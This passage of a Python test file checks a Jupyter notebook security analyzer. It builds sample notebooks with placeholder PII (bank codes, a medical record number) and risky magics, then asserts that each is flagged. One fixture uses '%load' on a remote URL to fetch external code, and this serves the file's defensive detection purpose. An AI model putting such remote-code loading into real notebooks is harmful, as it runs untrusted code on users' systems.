            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        pii_issues = [i for i in issues if i.category == "PII Exposure"]
        assert len(pii_issues) >= 1
        assert any("IBAN" in i.message or "SWIFT" in i.message for i in pii_issues)

        temp_notebook.unlink()

    def test_medical_record_detection(self, temp_notebook):
        """Test detection of medical record numbers."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# Medical data\n",
                        "patient_mrn = 'MRN: 1234567'\n",
                        "diagnosis = 'A00.1'  # ICD-10 code",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        pii_issues = [i for i in issues if i.category == "PII Exposure"]
        assert len(pii_issues) >= 1
        assert any(
            "Medical" in i.message or "MRN" in i.message or "ICD" in i.message for i in pii_issues
        )

        temp_notebook.unlink()


class TestEnhancedShellMagics:
    """Test enhanced shell and magic command detection."""

    def test_conda_install_detection(self, temp_notebook):
        """Test detection of %conda install commands."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": ["%conda install numpy\n", "%conda install -c conda-forge pandas"],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        magic_issues = [
            i for i in issues if i.category in ["Unsafe Magic Command", "Unpinned Dependency"]
        ]
        assert len(magic_issues) >= 1

        temp_notebook.unlink()

    def test_load_magic_detection(self, temp_notebook):
        """Test detection of %load and %loadpy magic commands."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "%load https://example.com/script.py\n",
                        "%loadpy external_script.py",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        magic_issues = [i for i in issues if i.category == "Unsafe Magic Command"]
        assert len(magic_issues) >= 1
        assert any("%load" in i.code_snippet for i in magic_issues)

        temp_notebook.unlink()
